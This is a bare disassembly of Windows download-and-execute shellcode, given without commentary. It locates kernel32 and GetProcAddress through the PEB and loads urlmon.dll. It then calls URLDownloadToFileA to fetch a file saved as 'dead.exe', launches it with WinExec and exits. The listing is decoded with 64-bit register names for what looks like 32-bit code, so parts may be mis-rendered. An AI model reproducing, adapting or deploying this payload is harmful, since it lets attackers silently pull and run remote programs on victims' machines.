xor    ecx,ecx
mov    eax,DWORD PTR fs:[rcx+0x30]
mov    eax,DWORD PTR [rax+0xc]
mov    esi,DWORD PTR [rax+0x14]
lods   eax,DWORD PTR ds:[rsi]
xchg   esi,eax
lods   eax,DWORD PTR ds:[rsi]
mov    ebx,DWORD PTR [rax+0x10]
mov    edx,DWORD PTR [rbx+0x3c]
add    edx,ebx
mov    edx,DWORD PTR [rdx+0x78]
add    edx,ebx
mov    esi,DWORD PTR [rdx+0x20]
add    esi,ebx
xor    ecx,ecx
rex.B lods eax,DWORD PTR ds:[rsi]
add    eax,ebx
cmp    DWORD PTR [rax],0x50746547
jne    0x23
cmp    DWORD PTR [rax+0x4],0x41636f72
jne    0x23
cmp    DWORD PTR [rax+0x8],0x65726464
jne    0x23
mov    esi,DWORD PTR [rdx+0x24]
add    esi,ebx
mov    cx,WORD PTR [rsi+rcx*2]
mov    rsi,QWORD PTR [r10+0x1c]
add    esi,ebx
mov    edx,DWORD PTR [rsi+rcx*4]
add    edx,ebx
xor    ecx,ecx
push   rcx
push   0x6578652e
push   0x64616564
push   rbx
push   rdx
push   rcx
push   0x41797261
push   0x7262694c
push   0x64616f4c
push   rsp
push   rbx
call   rdx
add    esp,0xc
pop    rcx
push   rax
push   rcx
mov    cx,0x6c6c
push   rcx
push   0x642e6e6f
push   0x6d6c7275
push   rsp
call   rax
add    esp,0x10
mov    edx,DWORD PTR [rsp+0x4]
xor    ecx,ecx
push   rcx
mov    cx,0x4165
push   rcx
xor    ecx,ecx
push   0x6c69466f
push   0x5464616f
push   0x6c6e776f
push   0x444c5255
push   rsp
push   rax
call   rdx
xor    ecx,ecx
lea    edx,[rsp+0x24]
push   rcx
push   rcx
push   rdx
jmp    0x10b
push   rcx
call   rax
add    esp,0x1c
xor    ecx,ecx
pop    rdx
pop    rbx
push   rbx
push   rdx
push   rcx
push   0x61636578
mov    BYTE PTR [rsp+0x3],cl
push   0x456e6957
push   rsp
push   rbx
call   rdx
push   0x5
lea    ecx,[rsp+0x18]
push   rcx
call   rax
add    esp,0xc
pop    rdx
pop    rbx
push   0x61737365
sub    DWORD PTR [rsp+0x3],0x61
push   0x636f7250
push   0x74697845
push   rsp
push   rbx
call   rdx
call   rax
call   0xc4
